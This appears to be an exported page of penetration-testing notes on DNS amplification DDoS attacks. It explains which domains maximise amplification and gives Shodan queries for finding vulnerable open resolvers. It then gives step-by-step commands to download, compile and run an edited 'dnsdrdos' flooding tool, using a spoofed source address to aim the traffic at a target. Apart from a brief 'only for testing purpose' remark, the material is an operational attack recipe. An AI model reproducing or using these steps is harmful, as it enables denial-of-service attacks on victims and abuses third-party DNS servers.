<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>botnet: which domain and DNS use?</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>botnet: which domain and DNS use?</h1><br/><br /><strong>Which domains use?</strong><br />• TLD domains<br />• domains that use DNSSEC (e.g.: cloudflare.com)<br />usually are the most requested domain names by malicious users.<br />Because of these domains cover a large zone they have a lot of input that increase the received message that consequentially increase the amplification factor.<br /><div class="codebox"><pre>dig @45.156.201.87 ads -t ANY</pre></div><br />    <a href=""><img src="images/1028-1.png" alt="images/1028-1.png" /></a><br />When we set up the amplification module scanner/dns/dns_amp to test, we have to insert the TLD or domains that use DNSSEC without the dot like that:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> domainname ads</pre></div><br /><br /><strong>Which DNS Open resolver use?</strong><br />To find them it is possible to search on shodan for DNS open resolver.<br />Go to <a href="https://www.shodan.io/">https://www.shodan.io/</a> login and search for  “port:53 Recursion: enabled 9.3.2” or “port:53 Recursion: enabled dnsmasq-2.40” <br />*BIND 9.3.2 by default is set to do recursive delegation<br /><a href=""><img src="images/1028-2.png" alt="images/1028-2.png" /></a><br /><br /><br /><strong>How do a DDOS attack(only for testing purpose!)</strong><br />With the edited script of Noptrix of Nullsecurity: <a href="https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c">https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c</a><br />I have edited it to amplify the results to have bigger responses<br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># makedir ddos<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>DenFox93<span style="color:#ff9d00;font-weight:700">/</span>DNS-Amplification-DDOS-attack<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>dnsdrdosV2.c<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">gcc</span> dnsdrdosV2.c -o dnsdrdosV2                        <span style="color:#0088ff;font-weight:400">#compile</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># .<span style="color:#ff9d00;font-weight:700">/</span>dnsdrdosV2 -H                                     <span style="color:#0088ff;font-weight:400">#manual</span><br /></pre></div><br />    <a href=""><img src="images/1028-3.png" alt="images/1028-3.png" /></a><br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># gedit servers.txt                                          <span style="color:#0088ff;font-weight:400">#here we insert the DNS open resolvers taken from shodan</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># .<span style="color:#ff9d00;font-weight:700">/</span>dnsdrdosV2 -f servers.txt -s 192.168.1.122 -d org          <span style="color:#0088ff;font-weight:400">#we are spoofing the source address with 192.168.1.122</span><br />                                                                        <span style="color:#0088ff;font-weight:400">#in this way, 192.168.1.122 will become our target</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span>#</pre></div><br /> <br />What part of the code of the script i have edited →  <a href="gy--Network_Pentest--Exploitation--Services_Attacks--DNS_(53)--DNS_Amplification_Attack--botnet_which_domain_and_DNS_use--Edit_dnsdrdos.c.html">edit dnsdrdos.c</a> <br />Original code: <a href="https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c">https://raw.githubusercontent.com/nullsecuritynet/tools/master/dos/dnsdrdos/release/dnsdrdos.c</a><br />You can find the edited code here: <a href="https://github.com/DenFox93/DNS-Amplification-DDOS-attack">https://github.com/DenFox93/DNS-Amplification-DDOS-attack</a><br /><br /><br /><br /><br /><br />Bibliography:<br />• <a href="https://www.researchgate.net/publication/264728528_Fingerprinting_Internet_DNS_Amplification_DDoS_Activities">https://www.researchgate.net/publication/264728528_Fingerprinting_Internet_DNS_Amplification_DDoS_Activities</a></div>
</body>
</html>
